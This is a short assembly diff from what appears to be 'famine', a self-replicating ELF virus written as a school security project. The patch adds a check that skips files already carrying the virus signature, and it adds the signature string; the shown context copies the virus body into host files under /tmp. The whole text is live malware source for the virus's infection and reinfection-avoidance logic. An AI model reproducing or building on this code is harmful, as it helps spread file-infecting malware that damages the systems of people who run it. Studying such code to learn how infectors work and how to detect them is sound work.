@@ -218,6 +218,9 @@ insert:                                                         ; expecting data
 
                 lea         rdi, [rel _start]
                 xchg        rdi, rsi
+                mov         rax, [rel signature]
+                cmp         rax, qword [rdi - (_finish - signature)]
+                jz          .return                             ; already infected
                 mov         rcx, _finish - _start
                 repnz       movsb
 
@@ -245,6 +248,7 @@ insert:                                                         ; expecting data
                 ret
 
 slash_tmp   db "/tmp",0
+signature   db "famine v0.1 @42siliconvalley",0
 pie_address dq _start
 entry       dq _host
 _finish     equ $
